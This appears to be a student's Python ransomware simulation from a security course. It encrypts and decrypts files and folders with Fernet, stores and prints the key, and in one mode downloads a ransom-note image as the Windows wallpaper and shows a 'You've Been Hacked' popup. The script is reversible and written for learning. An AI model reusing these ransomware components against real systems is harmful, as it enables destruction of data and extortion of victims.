#!/usr/bin/env python3

# Script Name:                  ops401d8-day08
# Author:                       Jonathan McMullin
# Date of latest revision:      07/19/2023
# Purpose:                      Encryption v3 - Malware simulation 

# Credit: Utilized syntax from Marco's Demo and ChatGPT to develop this script

# import libraries
from cryptography.fernet import Fernet
import os
import ctypes # so we can intereact with windows dlls and change windows background + popup
import urllib.request # used for downloading and saving background image



# Function to check if key.key exists already, and if not generates a new one
def write_key():
    if os.path.isfile("key.key"):
        # If the key file exists, read the key from the file
        with open("key.key", "rb") as key_file:
            key = key_file.read()
    else:
        # Generate a new key and save it to the file
        key = Fernet.generate_key()
        with open("key.key", "wb") as key_file:
            key_file.write(key)
    return key

# Function to load the generated key for encryption/decryption
def load_key():
    # Return the key from the key.key file - Chat GPT Recommended adding .read()
    return open("key.key", "rb").read()

# Function to encrypt a file
def encrypt_file(file_path):
    with open(file_path, "rb") as file:
        # reads file:
        data = file.read()
    f = Fernet(load_key())
    encrypted_data = f.encrypt(data)
    with open(file_path, "wb") as file:
        file.write(encrypted_data)

# Function to decrypt a file
def decrypt_file(file_path):
    f = Fernet(load_key())
    with open(file_path, "rb") as file:
        encrypted_data = file.read()
    decrypted_data = f.decrypt(encrypted_data)
    with open(file_path, "wb") as file:
        file.write(decrypted_data)

# Function to recursively encrypt a folder and its contents
def encrypt_folder(folder_path):
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            file_path = os.path.join(root, file)
            if file_path.endswith(".txt"):
                encrypt_file(file_path)
    print("Folder and its contents encrypted successfully.")

# Function to recursively decrypt an encrypted folder and its contents
def decrypt_folder(folder_path):
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            file_path = os.path.join(root, file)
            if file_path.endswith(".txt"):
                decrypt_file(file_path)
    print("Folder and its contents decrypted successfully.")

# Function to encrypt a message
def encrypt_message(message):
    f = Fernet(load_key())
    encrypted_message = f.encrypt(message.encode())
    print("The encrypted message is: " + encrypted_message.decode())

# Function to decrypt a message
def decrypt_message(encrypted_message):
    f = Fernet(load_key())
    decrypted_message = f.decrypt(encrypted_message.encode())
    print("The decrypted message is: " + decrypted_message.decode())

# Function to change Windows Desktop background to Ransomware
# using portions from "ncorbuk" python-ransomware

def change_desktop_background():
    imageUrl = 'https://www.pcrisk.com/images/stories/screenshots202102/text-ransomware-ransom-note.jpg'
    # Go to specif url and download+save image using absolute path
    path = os.path.join(os.environ['USERPROFILE'], 'Desktop', 'background.jpg')
    urllib.request.urlretrieve(imageUrl, path)
    SPI_SETDESKWALLPAPER = 20
    # Access windows dlls for funcionality eg, changing dekstop wallpaper
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)

# function to create a popup message
#  using content from https://www.devdungeon.com/content/dialog-boxes-python 

def pop_up_box():
    MessageBox = ctypes.windll.user32.MessageBoxW
    MessageBox(None, "You've Been Hacked, don't panic, follow the instructions on your Desktop.", 'Window title', 0)

# Main
if __name__ == "__main__":
    # Generate and write the new key
    key = write_key()

    print("Key is: " + key.decode('utf-8'))

    # Menu - Prompt user for mode selection
    mode = int(input("Select a mode:\n1. Encrypt a file\n2. Decrypt a file\n3. Encrypt a message\n4. Decrypt a message\n5. Recursively encrypt a folder\n6. Recursively decrypt an encrypted folder\n7. Ransomware Simulation (Windows only)\n"))

    if mode == 1 or mode == 2:
        # Prompt user for the file path
        file_path = input("Enter the file path: ")

        if mode == 1:
            # Encrypt the target file
            encrypt_file(file_path)
            print("File encrypted successfully.")
        else:
            # Decrypt the target file
            decrypt_file(file_path)
            print("File decrypted successfully.")

    elif mode == 3 or mode == 4:
        # Prompt user for the message
        message = input("Enter the message: ")

        if mode == 3:
            # Encrypt the message
            encrypt_message(message)
        else:
            # Decrypt the message
            decrypt_message(message)

    elif mode == 5:
        # Prompt user for the folder path
        folder_path = input("Enter the folder path: ")

        # Recursively encrypt the folder and its contents
        encrypt_folder(folder_path)

    elif mode == 6:
        # Prompt user for the folder path
        folder_path = input("Enter the folder path: ")

        # Recursively decrypt the encrypted folder and its contents
        decrypt_folder(folder_path)
    
    elif mode == 7: 
        change_desktop_background()
        pop_up_box()
        print("Check your Desktop")

    else:
        print("Invalid mode selection.")